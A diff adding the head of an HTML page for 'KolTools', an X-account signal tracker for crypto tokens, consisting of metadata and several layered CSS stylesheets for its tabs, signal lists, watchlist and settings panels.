@@ -1,0 +1,2333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>KolTools | X signal tracker</title>
+  <meta name="description" content="KolTools live X account monitoring for early market signals." />
+  <meta name="theme-color" content="#080907" />
+  <meta name="referrer" content="no-referrer" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Crect width='64' height='64' rx='14' fill='%238ca46a'/%3E%3Cpath d='M16 38h9l5-15 7 24 5-15h6' fill='none' stroke='%23080907' stroke-width='5' stroke-linecap='square' stroke-linejoin='round'/%3E%3C/svg%3E" />
+  <style>
+    :root {
+      color-scheme: dark;
+      --canvas: #0b0c0c;
+      --surface: #111313;
+      --raised: #171a19;
+      --soft: #202322;
+      --line: #202322;
+      --line-strong: #303332;
+      --text: #f2f3ed;
+      --muted: #989d98;
+      --dim: #656a66;
+      --accent: #a9ff5a;
+      --accent-soft: rgba(169, 255, 90, 0.11);
+      --display: "Arial Narrow", "DM Sans", Arial, sans-serif;
+      --mono: "DM Mono", monospace;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body { width: 100%; min-width: 17.5rem; height: 100%; min-height: 100%; }
+    body {
+      overflow: hidden;
+      background: var(--canvas);
+      color: var(--text);
+      font: 400 0.8125rem/1.5 var(--display);
+      -webkit-font-smoothing: antialiased;
+    }
+    button, input, textarea { font: inherit; }
+    button, label, summary { -webkit-tap-highlight-color: transparent; }
+
+    .tab-control {
+      position: fixed;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+    .skip-link {
+      position: fixed;
+      top: -4rem;
+      left: 0.75rem;
+      z-index: 20;
+      padding: 0.5rem 0.75rem;
+      background: var(--text);
+      color: var(--canvas);
+      text-decoration: none;
+    }
+    .skip-link:focus { top: 0.75rem; }
+
+    .popup-shell {
+      width: 100%;
+      height: 100dvh;
+      display: grid;
+      grid-template-rows: 3.25rem auto 2.875rem minmax(0, 1fr);
+      background:
+        radial-gradient(circle at 100% 0, rgba(169, 255, 90, 0.075), transparent 14rem),
+        var(--canvas);
+    }
+
+    .topbar {
+      display: flex;
+      align-items: center;
+      gap: 0.625rem;
+      padding: 0 0.875rem;
+      border-bottom: 1px solid var(--line);
+    }
+    .brand-mark {
+      position: relative;
+      width: 1.625rem;
+      height: 1.625rem;
+      flex: 0 0 1.625rem;
+      border-radius: 0.3125rem;
+      background: var(--accent);
+    }
+    .brand-mark::before {
+      content: "";
+      position: absolute;
+      inset: 0.4375rem 0.3125rem;
+      border-block: 2px solid var(--canvas);
+      transform: skewY(-20deg);
+    }
+    .brand-name { font-weight: 600; letter-spacing: -0.025em; }
+    .version {
+      color: var(--dim);
+      font: 0.5rem var(--mono);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+    .topbar-spacer { flex: 1; }
+    .live-label {
+      display: flex;
+      align-items: center;
+      gap: 0.375rem;
+      color: var(--muted);
+      font: 0.5rem var(--mono);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      white-space: nowrap;
+    }
+    .pulse-dot {
+      width: 0.3125rem;
+      height: 0.3125rem;
+      border-radius: 50%;
+      background: var(--accent);
+      box-shadow: 0 0 0 0 rgba(169, 255, 90, 0.45);
+      animation: pulse 2s ease-out infinite;
+    }
+
+    .runner-status {
+      display: grid;
+      grid-template-columns: 1.5rem minmax(0, 1fr) auto;
+      align-items: center;
+      gap: 0.625rem;
+      min-height: 3.75rem;
+      padding: 0.625rem 0.875rem;
+      border-bottom: 1px solid var(--line);
+      background: rgba(20, 23, 18, 0.7);
+    }
+    .spinner, .check {
+      position: relative;
+      width: 1.5rem;
+      height: 1.5rem;
+      border: 1px solid var(--line-strong);
+      border-radius: 50%;
+    }
+    .spinner::before {
+      content: "";
+      position: absolute;
+      inset: 0.25rem;
+      border: 2px solid transparent;
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    .check { display: none; border-color: var(--accent); background: var(--accent); }
+    .check::after {
+      content: "";
+      position: absolute;
+      left: 0.525rem;
+      top: 0.3rem;
+      width: 0.3rem;
+      height: 0.6rem;
+      border: solid var(--canvas);
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+    }
+    .ok .spinner { display: none; }
+    .ok .check { display: block; }
+    .status-copy { min-width: 0; }
+    .status-copy h1 {
+      overflow: hidden;
+      font-size: 0.75rem;
+      font-weight: 500;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    .status-copy p {
+      overflow: hidden;
+      margin-top: 0.0625rem;
+      color: var(--dim);
+      font-size: 0.625rem;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    .secure-label {
+      color: var(--accent);
+      font: 0.5rem var(--mono);
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .tabbar {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+      padding: 0 0.5rem;
+      border-bottom: 1px solid var(--line);
+    }
+    .tab {
+      position: relative;
+      display: grid;
+      place-items: center;
+      min-width: 0;
+      color: var(--dim);
+      font-size: 0.6875rem;
+      cursor: pointer;
+      transition: color 0.18s ease, background 0.18s ease;
+    }
+    .tab:hover { color: var(--text); background: rgba(239, 242, 232, 0.025); }
+    .tab::after {
+      content: "";
+      position: absolute;
+      right: 0.75rem;
+      bottom: -1px;
+      left: 0.75rem;
+      height: 2px;
+      background: transparent;
+      transform: scaleX(0.35);
+      transition: transform 0.18s ease, background 0.18s ease;
+    }
+    #tab-signals:checked ~ #ui label[for="tab-signals"],
+    #tab-watchlist:checked ~ #ui label[for="tab-watchlist"],
+    #tab-matches:checked ~ #ui label[for="tab-matches"],
+    #tab-settings:checked ~ #ui label[for="tab-settings"] { color: var(--text); }
+    #tab-signals:checked ~ #ui label[for="tab-signals"]::after,
+    #tab-watchlist:checked ~ #ui label[for="tab-watchlist"]::after,
+    #tab-matches:checked ~ #ui label[for="tab-matches"]::after,
+    #tab-settings:checked ~ #ui label[for="tab-settings"]::after {
+      background: var(--accent);
+      transform: scaleX(1);
+    }
+    #tab-signals:focus-visible ~ #ui label[for="tab-signals"],
+    #tab-watchlist:focus-visible ~ #ui label[for="tab-watchlist"],
+    #tab-matches:focus-visible ~ #ui label[for="tab-matches"],
+    #tab-settings:focus-visible ~ #ui label[for="tab-settings"] {
+      outline: 2px solid var(--accent);
+      outline-offset: -3px;
+    }
+
+    .content {
+      min-height: 0;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: var(--soft) transparent;
+    }
+    .view { display: none; padding: 1rem 0.875rem 1.5rem; }
+    #tab-signals:checked ~ #ui .view-signals,
+    #tab-watchlist:checked ~ #ui .view-watchlist,
+    #tab-matches:checked ~ #ui .view-matches,
+    #tab-settings:checked ~ #ui .view-settings { display: block; }
+
+    .section-head {
+      display: flex;
+      align-items: end;
+      justify-content: space-between;
+      gap: 1rem;
+      margin-bottom: 0.875rem;
+    }
+    .eyebrow, .section-meta, .metric-label, .signal-time, .badge, .chain, .setting-note {
+      font-family: var(--mono);
+      letter-spacing: 0.07em;
+      text-transform: uppercase;
+    }
+    .eyebrow { color: var(--accent); font-size: 0.5rem; }
+    .section-head h2 { margin-top: 0.25rem; font-size: 1.125rem; font-weight: 500; letter-spacing: -0.035em; }
+    .section-meta { color: var(--dim); font-size: 0.5rem; white-space: nowrap; }
+
+    .metrics {
+      display: grid;
+      grid-template-columns: repeat(3, minmax(0, 1fr));
+      margin-bottom: 1rem;
+      border-block: 1px solid var(--line);
+    }
+    .metric { padding: 0.75rem 0; }
+    .metric + .metric { padding-left: 0.75rem; border-left: 1px solid var(--line); }
+    .metric-label { color: var(--dim); font-size: 0.4375rem; }
+    .metric-value { margin-top: 0.125rem; font: 500 1rem var(--mono); font-variant-numeric: tabular-nums; }
+    .metric-value small { color: var(--accent); font-size: 0.5rem; }
+
+    .signal-list, .account-list, .match-list { list-style: none; border-top: 1px solid var(--line); }
+    .signal {
+      display: grid;
+      grid-template-columns: 2.25rem minmax(0, 1fr) auto;
+      gap: 0.625rem;
+      padding: 0.875rem 0;
+      border-bottom: 1px solid var(--line);
+    }
+    .avatar {
+      display: grid;
+      place-items: center;
+      width: 2.25rem;
+      height: 2.25rem;
+      border: 1px solid var(--line-strong);
+      border-radius: 0.375rem;
+      background: var(--raised);
+      color: var(--muted);
+      font-size: 0.6875rem;
+      font-weight: 600;
+    }
+    .signal-body { min-width: 0; }
+    .signal-author { display: flex; align-items: baseline; gap: 0.375rem; min-width: 0; }
+    .signal-author strong { overflow: hidden; font-size: 0.75rem; font-weight: 600; text-overflow: ellipsis; white-space: nowrap; }
+    .signal-author span { overflow: hidden; color: var(--dim); font: 0.5625rem var(--mono); text-overflow: ellipsis; white-space: nowrap; }
+    .signal-copy { margin-top: 0.25rem; color: var(--muted); font-size: 0.6875rem; line-height: 1.45; }
+    .signal-time { margin-top: 0.375rem; color: var(--dim); font-size: 0.4375rem; }
+    .badge {
+      align-self: start;
+      padding: 0.1875rem 0.3125rem;
+      border: 1px solid var(--line-strong);
+      border-radius: 0.1875rem;
+      color: var(--dim);
+      font-size: 0.4375rem;
+    }
+    .badge.hot { border-color: rgba(169, 255, 90, 0.32); background: var(--accent-soft); color: var(--accent); }
+
+    .account-row {
+      display: grid;
+      grid-template-columns: 2.25rem minmax(0, 1fr) auto;
+      align-items: center;
+      gap: 0.625rem;
+      padding: 0.75rem 0;
+      border-bottom: 1px solid var(--line);
+    }
+    .account-copy { min-width: 0; }
+    .account-name { overflow: hidden; font-size: 0.75rem; font-weight: 500; text-overflow: ellipsis; white-space: nowrap; }
+    .account-handle { overflow: hidden; margin-top: 0.125rem; color: var(--dim); font: 0.5625rem var(--mono); text-overflow: ellipsis; white-space: nowrap; }
+    .online { display: flex; align-items: center; gap: 0.3125rem; color: var(--muted); font: 0.5rem var(--mono); }
+    .online::before { content: ""; width: 0.3125rem; height: 0.3125rem; border-radius: 50%; background: var(--accent); }
+
+    .remove-account {
+      border: 0;
+      background: transparent;
+      color: var(--dim);
+      font: 0.5rem var(--mono);
+      text-transform: uppercase;
+      cursor: pointer;
+      transition: color 0.18s ease;
+    }
+    .remove-account:hover { color: var(--text); }
+    .remove-account:focus-visible { outline: 2px solid var(--accent); outline-offset: 0.25rem; }
+
+    .add-account { margin-bottom: 1rem; }
+    .add-account > label { display: block; margin-bottom: 0.375rem; color: var(--muted); font-size: 0.625rem; }
+    .add-account-row { display: grid; grid-template-columns: minmax(0, 1fr) auto; }
+    .add-account input {
+      min-width: 0;
+      height: 2.5rem;
+      padding: 0 0.625rem;
+      border: 1px solid var(--line-strong);
+      border-right: 0;
+      border-radius: 0.25rem 0 0 0.25rem;
+      outline: none;
+      background: var(--raised);
+      color: var(--text);
+      font: 0.6875rem var(--mono);
+    }
+    .add-account input:focus { border-color: var(--accent); box-shadow: inset 1px 0 var(--accent), inset 0 1px var(--accent), inset 0 -1px var(--accent); }
+    .add-account input[aria-invalid="true"] { border-color: #e49283; }
+    .add-account button {
+      height: 2.5rem;
+      padding: 0 0.875rem;
+      border: 1px solid var(--accent);
+      border-radius: 0 0.25rem 0.25rem 0;
+      background: var(--accent);
+      color: #0b0c0c;
+      font-size: 0.6875rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: filter 0.18s ease, transform 0.18s ease;
+    }
+    .add-account button:hover { filter: brightness(0.9); }
+    .add-account button:active { transform: translateY(1px); }
+    .add-account button:focus-visible { outline: 2px solid var(--text); outline-offset: 2px; }
+    .form-help, .form-error { min-height: 0.875rem; margin-top: 0.3125rem; font: 0.5rem var(--mono); }
+    .form-help { color: var(--dim); }
+    .form-error { color: #e49283; }
+
+    .match-card {
+      padding: 0.875rem 0;
+      border-bottom: 1px solid var(--line);
+    }
+    .match-top { display: flex; align-items: center; gap: 0.5rem; }
+    .ticker { font: 500 0.875rem var(--mono); }
+    .chain { padding: 0.125rem 0.25rem; background: var(--accent-soft); color: var(--accent); font-size: 0.4375rem; }
+    .match-time { margin-left: auto; color: var(--dim); font: 0.5rem var(--mono); }
+    .address {
+      overflow: hidden;
+      margin-top: 0.5rem;
+      padding: 0.5rem 0.625rem;
+      border: 1px solid var(--line);
+      border-radius: 0.25rem;
+      background: var(--raised);
+      color: var(--muted);
+      font: 0.5625rem var(--mono);
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    .match-source { margin-top: 0.4375rem; color: var(--dim); font-size: 0.625rem; }
+
+    .settings-group { border-top: 1px solid var(--line); }
+    .setting {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) auto;
+      align-items: center;
+      gap: 1rem;
+      padding: 0.875rem 0;
+      border-bottom: 1px solid var(--line);
+    }
+    .setting-title { font-size: 0.75rem; font-weight: 500; }
+    .setting-note { margin-top: 0.1875rem; color: var(--dim); font-size: 0.4375rem; line-height: 1.5; }
+    .switch { position: relative; width: 2rem; height: 1.125rem; }
+    .switch input { position: absolute; inset: 0; z-index: 2; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
+    .switch-track {
+      position: absolute;
+      inset: 0;
+      border: 1px solid var(--line-strong);
+      border-radius: 1rem;
+      background: var(--raised);
+      cursor: pointer;
+      pointer-events: none;
+      transition: background 0.18s ease, border-color 0.18s ease;
+    }
+    .switch-track::after {
+      content: "";
+      position: absolute;
+      top: 0.1875rem;
+      left: 0.1875rem;
+      width: 0.625rem;
+      height: 0.625rem;
+      border-radius: 50%;
+      background: var(--dim);
+      transition: transform 0.18s ease, background 0.18s ease;
+    }
+    .switch input:checked + .switch-track { border-color: var(--accent); background: var(--accent-soft); }
+    .switch input:checked + .switch-track::after { background: var(--accent); transform: translateX(0.875rem); }
+    .switch input:focus-visible + .switch-track { outline: 2px solid var(--accent); outline-offset: 2px; }
+
+    .watch-editor { margin-top: 1rem; }
+    .watch-editor label { display: block; margin-bottom: 0.375rem; color: var(--muted); font-size: 0.625rem; }
+    .watch-editor textarea {
+      width: 100%;
+      min-height: 6rem;
+      resize: vertical;
+      padding: 0.625rem;
+      border: 1px solid var(--line);
+      border-radius: 0.25rem;
+      outline: none;
+      background: var(--raised);
+      color: var(--text);
+      font: 0.625rem/1.6 var(--mono);
+    }
+    .watch-editor textarea:focus { border-color: var(--accent); box-shadow: 0 0 0 1px var(--accent); }
+
+    .info-panel {
+      margin-top: 1rem;
+      border: 1px solid var(--line);
+      border-radius: 0.25rem;
+      background: var(--raised);
+    }
+    .info-panel summary {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0.75rem;
+      color: var(--muted);
+      font-size: 0.6875rem;
+      cursor: pointer;
+      list-style: none;
+    }
+    .info-panel summary::-webkit-details-marker { display: none; }
+    .info-panel summary::after { content: "+"; color: var(--accent); font: 0.875rem var(--mono); }
+    .info-panel[open] summary::after { content: "−"; }
+    .info-panel p { padding: 0 0.75rem 0.75rem; color: var(--dim); font-size: 0.625rem; line-height: 1.55; }
+
+    .contracts-only .signal.is-mention { display: none; }
+    .compact .signal { grid-template-columns: 1.75rem minmax(0, 1fr) auto; padding-block: 0.5625rem; }
+    .compact .signal .avatar { width: 1.75rem; height: 1.75rem; }
+    .compact .signal-copy { display: none; }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes pulse { 70% { box-shadow: 0 0 0 0.45rem transparent; } 100% { box-shadow: 0 0 0 0 transparent; } }
+
+    @media (min-width: 32rem) {
+      body { display: grid; place-items: center; padding: 1rem; background: #050604; }
+      .popup-shell {
+        width: min(100%, 32rem);
+        height: min(46rem, calc(100dvh - 2rem));
+        border: 1px solid var(--line-strong);
+        border-radius: 0.5rem;
+        box-shadow: 0 2rem 7rem rgba(0, 0, 0, 0.55);
+        overflow: hidden;
+      }
+      .view { padding: 1.25rem; }
+    }
+
+    @media (max-width: 21rem) {
+      .version, .secure-label, .section-meta { display: none; }
+      .topbar, .runner-status, .view { padding-inline: 0.625rem; }
+      .tabbar { padding-inline: 0; }
+      .tab { font-size: 0.625rem; }
+      .metrics { grid-template-columns: 1fr 1fr; }
+      .metric:nth-child(3) { display: none; }
+      .signal { grid-template-columns: 2rem minmax(0, 1fr); }
+      .avatar { width: 2rem; height: 2rem; }
+      .badge { grid-column: 2; justify-self: start; }
+    }
+
+    @media (max-height: 30rem) {
+      .popup-shell { grid-template-rows: 2.75rem auto 2.5rem minmax(0, 1fr); }
+      .runner-status { min-height: 3.25rem; padding-block: 0.375rem; }
+      .view { padding-top: 0.75rem; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; }
+    }
+  </style>
+  <style>
+    /* Product UI redesign: graphite surfaces, emerald status, readable density. */
+    :root {
+      --canvas: #080a09;
+      --surface: #0e1110;
+      --raised: #151917;
+      --soft: #1b211e;
+      --line: #252c28;
+      --line-strong: #39423d;
+      --text: #f3f7f4;
+      --muted: #b1bbb5;
+      --dim: #7f8a83;
+      --accent: #62e995;
+      --accent-soft: rgba(98, 233, 149, 0.11);
+    }
+
+    body {
+      background:
+        radial-gradient(circle at 12% -10%, rgba(98, 233, 149, 0.09), transparent 24rem),
+        #050706;
+    }
+
+    .popup-shell {
+      background: linear-gradient(180deg, rgba(18, 22, 20, 0.98), rgba(8, 10, 9, 0.99));
+    }
+
+    .topbar {
+      min-height: 4rem;
+      background: rgba(8, 10, 9, 0.8);
+    }
+
+    .brand-mark {
+      border-radius: 0.5rem;
+      box-shadow: 0 0 1.5rem rgba(98, 233, 149, 0.16);
+    }
+
+    .brand-name { font-size: 1.0625rem; }
+    .live-label { color: #bde9cd; }
+
+    .runner-status {
+      min-height: 5rem;
+      background: rgba(98, 233, 149, 0.035);
+    }
+
+    .status-copy h1 {
+      font-size: 1rem;
+      font-weight: 600;
+    }
+
+    .status-copy p {
+      margin-top: 0.2rem;
+      color: var(--muted);
+      font-size: 0.8125rem;
+    }
+
+    .tabbar {
+      min-height: 3.75rem;
+      background: rgba(8, 10, 9, 0.72);
+    }
+
+    .tab {
+      position: relative;
+      min-height: 3.75rem;
+      color: var(--dim);
+      font-size: 0.75rem;
+      letter-spacing: 0.065em;
+    }
+
+    #tab-signals:checked ~ .popup-shell .tab[for="tab-signals"],
+    #tab-watchlist:checked ~ .popup-shell .tab[for="tab-watchlist"],
+    #tab-matches:checked ~ .popup-shell .tab[for="tab-matches"],
+    #tab-settings:checked ~ .popup-shell .tab[for="tab-settings"] {
+      color: var(--text);
+      background: var(--accent-soft);
+    }
+
+    .view { max-width: 64rem; }
+
+    .section-head h2 {
+      font-size: clamp(1.75rem, 4vw, 2.4rem);
+      letter-spacing: -0.035em;
+    }
+
+    .metrics {
+      border-color: var(--line-strong);
+      background: rgba(255, 255, 255, 0.018);
+    }
+
+    .metric-value { font-size: clamp(1.35rem, 4vw, 1.75rem); }
+
+    .signal-list,
+    .account-list,
+    .match-list { border-top: 0; }
+
+    .signal,
+    .account-row,
+    .match-card {
+      margin-bottom: 0.75rem;
+      border: 1px solid var(--line);
+      border-radius: 0.75rem;
+      background: rgba(255, 255, 255, 0.018);
+    }
+
+    .signal,
+    .account-row { padding: 1rem; }
+    .match-card { padding: 1rem; }
+
+    .signal:hover,
+    .account-row:hover,
+    .match-card:hover {
+      border-color: var(--line-strong);
+      background: rgba(255, 255, 255, 0.03);
+    }
+
+    .account-copy { overflow: hidden; }
+
+    .account-handle.fresh,
+    .account-handle.updated { color: #8deeb1; }
+    .account-handle.stale { color: #d7c995; }
+    .account-handle.error { color: #ef9a9a; }
+
+    .account-latest {
+      margin-top: 0.8rem;
+      padding: 0.85rem 0.9rem;
+      border: 1px solid var(--line);
+      border-radius: 0.5rem;
+      background: #0a0d0b;
+    }
+
+    .account-latest-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.75rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .account-post-label,
+    .account-post-time {
+      color: var(--dim);
+      font: 500 0.6875rem/1.35 var(--mono);
+      letter-spacing: 0.055em;
+      text-transform: uppercase;
+    }
+
+    .account-post-copy {
+      display: -webkit-box;
+      overflow: hidden;
+      color: #dce3de;
+      font-size: 0.875rem;
+      line-height: 1.55;
+      overflow-wrap: anywhere;
+      -webkit-box-orient: vertical;
+      -webkit-line-clamp: 4;
+    }
+
+    .account-post-link {
+      display: inline-block;
+      margin-top: 0.65rem;
+      color: var(--accent);
+      font: 500 0.75rem/1.4 var(--mono);
+      text-underline-offset: 0.2rem;
+    }
+
+    .remove-account,
+    .refresh-tracker,
+    .copy-contract {
+      border-radius: 0.5rem;
+    }
+
+    .refresh-tracker {
+      border-color: var(--accent);
+      background: var(--accent);
+      color: #07100a;
+    }
+
+    .refresh-tracker:hover { background: #86f2ad; }
+    .refresh-tracker:active,
+    .copy-contract:active,
+    .add-account button:active { transform: translateY(1px); }
+
+    .empty-state {
+      border: 1px dashed var(--line-strong);
+      border-radius: 0.75rem;
+      padding: 2rem;
+      background: rgba(255, 255, 255, 0.012);
+      text-align: center;
+    }
+
+    @media (min-width: 48rem) {
+      body { padding: 1.5rem; }
+      .popup-shell {
+        width: min(100%, 68rem);
+        height: min(56rem, calc(100dvh - 3rem));
+        border-radius: 0.9rem;
+      }
+      .view { padding: 2rem 2.25rem 3rem; }
+      .account-row { grid-template-columns: 3rem minmax(0, 1fr) 5rem; padding: 1.25rem; }
+    }
+
+    @media (max-width: 39.9375rem) {
+      .popup-shell { grid-template-rows: 3.5rem auto 3.5rem minmax(0, 1fr); }
+      .topbar { min-height: 3.5rem; }
+      .runner-status { min-height: 4.5rem; }
+      .status-copy p {
+        white-space: normal;
+        display: -webkit-box;
+        -webkit-box-orient: vertical;
+        -webkit-line-clamp: 2;
+      }
+      .account-row { grid-template-columns: 2.5rem minmax(0, 1fr); }
+      .account-row .avatar { width: 2.5rem; height: 2.5rem; }
+      .account-row .remove-account {
+        grid-column: 2;
+        justify-self: start;
+        min-height: 2.5rem;
+        margin-top: 0.25rem;
+      }
+      .account-latest { margin-inline: -0.15rem; }
+      .account-post-copy { -webkit-line-clamp: 5; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after {
+        scroll-behavior: auto !important;
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
+      }
+    }
+  </style>
+  <style>
+    /* Visual alignment with the main FOMO Tracker site. */
+    :root {
+      --canvas: #0a0a0a;
+      --surface: #111111;
+      --raised: #161616;
+      --soft: #202020;
+      --line: rgba(255, 255, 255, 0.1);
+      --line-strong: rgba(255, 255, 255, 0.18);
+      --text: #f2f2f2;
+      --muted: #a4a4a4;
+      --dim: #737373;
+      --accent: #f5f5f5;
+      --accent-soft: rgba(255, 255, 255, 0.08);
+      --display: "Space Grotesk", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      --mono: "SF Mono", "Cascadia Code", "Roboto Mono", monospace;
+    }
+
+    body {
+      background: #050505;
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+
+    .popup-shell {
+      background:
+        linear-gradient(rgba(255, 255, 255, 0.018) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.018) 1px, transparent 1px),
+        var(--canvas);
+      background-size: 32px 32px;
+    }
+
+    .topbar {
+      gap: 0.7rem;
+      padding-inline: 1rem;
+      background: rgba(10, 10, 10, 0.9);
+      backdrop-filter: blur(16px);
+    }
+
+    .brand-mark {
+      width: 1.75rem;
+      height: 1.75rem;
+      flex-basis: 1.75rem;
+      border: 1px solid rgba(255, 255, 255, 0.16);
+      border-radius: 50%;
+      background:
+        radial-gradient(circle at 34% 46%, #0a0a0a 0 18%, transparent 19%),
+        radial-gradient(circle at 66% 46%, #0a0a0a 0 18%, transparent 19%),
+        #f2f2f2;
+      box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.035);
+    }
+
+    .brand-mark::before {
+      inset: auto 0.43rem 0.34rem;
+      height: 0.22rem;
+      border: 0;
+      border-bottom: 2px solid #0a0a0a;
+      border-radius: 50%;
+      transform: none;
+    }
+
+    .brand-name {
+      font-family: var(--display);
+      font-size: 0.88rem;
+      font-weight: 700;
+      letter-spacing: -0.035em;
+      text-transform: uppercase;
+    }
+
+    .version,
+    .live-label,
+    .secure-label {
+      letter-spacing: 0.11em;
+    }
+
+    .live-label { color: #b9b9b9; }
+    .pulse-dot {
+      background: #4ade80;
+      box-shadow: 0 0 0 0 rgba(74, 222, 128, 0.35);
+    }
+
+    .runner-status {
+      min-height: 4.25rem;
+      padding-inline: 1rem;
+      background: rgba(255, 255, 255, 0.025);
+    }
+
+    .spinner,
+    .check {
+      border-color: rgba(255, 255, 255, 0.2);
+      background: transparent;
+    }
+
+    .spinner::before { border-top-color: #f5f5f5; }
+    .check {
+      border-color: #f5f5f5;
+      background: #f5f5f5;
+    }
+    .check::after { border-color: #0a0a0a; }
+
+    .status-copy h1 {
+      font-family: var(--display);
+      font-weight: 700;
+      letter-spacing: -0.02em;
+    }
+
+    .secure-label { color: #bdbdbd; }
+
+    .tabbar {
+      padding-inline: 0.65rem;
+      background: #0d0d0d;
+    }
+
+    .tab {
+      color: #858585;
+      font-family: var(--mono);
+      font-size: 0.58rem;
+      font-weight: 600;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+    }
+
+    .tab:hover { background: rgba(255, 255, 255, 0.035); }
+    #tab-signals:checked ~ #ui label[for="tab-signals"]::after,
+    #tab-watchlist:checked ~ #ui label[for="tab-watchlist"]::after,
+    #tab-matches:checked ~ #ui label[for="tab-matches"]::after,
+    #tab-settings:checked ~ #ui label[for="tab-settings"]::after {
+      background: #f5f5f5;
+    }
+
+    .content { scrollbar-color: #555 transparent; }
+    .view { padding: 1.25rem 1rem 1.75rem; }
+    .section-head { margin-bottom: 1rem; }
+    .eyebrow { color: #bcbcbc; }
+    .section-head h2 {
+      font-family: var(--display);
+      font-size: 1.25rem;
+      font-weight: 700;
+      letter-spacing: -0.045em;
+    }
+
+    .metrics {
+      margin-bottom: 1.15rem;
+      border: 1px solid var(--line);
+      background: rgba(255, 255, 255, 0.018);
+    }
+    .metric { padding: 0.8rem 0.75rem; }
+    .metric + .metric { padding-left: 0.75rem; }
+    .metric-value { font-weight: 700; }
+    .metric-value small { color: #bcbcbc; }
+
+    .signal-list,
+    .account-list,
+    .match-list { border-top-color: rgba(255, 255, 255, 0.14); }
+
+    .signal,
+    .account-row,
+    .match-card,
+    .setting { border-bottom-color: rgba(255, 255, 255, 0.08); }
+
+    .signal { padding-block: 1rem; }
+    .avatar {
+      border-color: rgba(255, 255, 255, 0.13);
+      border-radius: 50%;
+      background: linear-gradient(145deg, #303030, #171717);
+      color: #f1f1f1;
+      font-family: var(--display);
+      font-weight: 700;
+    }
+    .signal-author strong,
+    .account-name { color: #fff; }
+    .signal-copy { color: #aaa; }
+
+    .badge {
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.025);
+    }
+    .badge.hot {
+      border-color: rgba(255, 255, 255, 0.24);
+      background: rgba(255, 255, 255, 0.09);
+      color: #f5f5f5;
+    }
+
+    .online::before { background: #4ade80; }
+    .remove-account:hover { color: #fff; }
+
+    .add-account input,
+    .watch-editor textarea,
+    .address,
+    .info-panel {
+      border-color: rgba(255, 255, 255, 0.12);
+      background: #141414;
+    }
+
+    .add-account input { border-radius: 0.45rem 0 0 0.45rem; }
+    .add-account input:focus,
+    .watch-editor textarea:focus {
+      border-color: rgba(255, 255, 255, 0.42);
+      box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.18);
+    }
+
+    .add-account button {
+      border-color: #f2f2f2;
+      border-radius: 0 0.45rem 0.45rem 0;
+      background: #f2f2f2;
+      color: #0a0a0a;
+      font-family: var(--display);
+      font-weight: 700;
+    }
+    .add-account button:hover { filter: brightness(0.82); }
+
+    .chain {
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.1);
+      color: #e4e4e4;
+    }
+
+    .address { border-radius: 0.45rem; }
+    .switch-track { background: #1b1b1b; }
+    .switch input:checked + .switch-track {
+      border-color: #f2f2f2;
+      background: rgba(255, 255, 255, 0.16);
+    }
+    .switch input:checked + .switch-track::after { background: #f2f2f2; }
+
+    .info-panel {
+      border-radius: 0.55rem;
+      background: rgba(255, 255, 255, 0.025);
+    }
+    .info-panel summary::after { color: #f2f2f2; }
+
+    .section-actions { display: flex; align-items: center; gap: 0.65rem; }
+    .refresh-tracker,
+    .copy-contract {
+      border: 1px solid var(--line-strong);
+      border-radius: 0.4rem;
+      background: transparent;
+      color: var(--text);
+      font: 600 0.62rem/1 var(--mono);
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
+      cursor: pointer;
+    }
+    .refresh-tracker { padding: 0.55rem 0.7rem; }
+    .copy-contract { margin-top: 0.65rem; padding: 0.5rem 0.65rem; }
+    .refresh-tracker:hover,
+    .copy-contract:hover { background: var(--accent-soft); }
+    .refresh-tracker:disabled { cursor: wait; opacity: 0.45; }
+    .empty-state {
+      padding: 1.5rem 0;
+      border-bottom: 1px solid var(--line);
+      color: var(--dim);
+      font-size: 0.78rem;
+      line-height: 1.55;
+      list-style: none;
+    }
+    a.match-source { display: inline-block; color: var(--muted); text-decoration: none; }
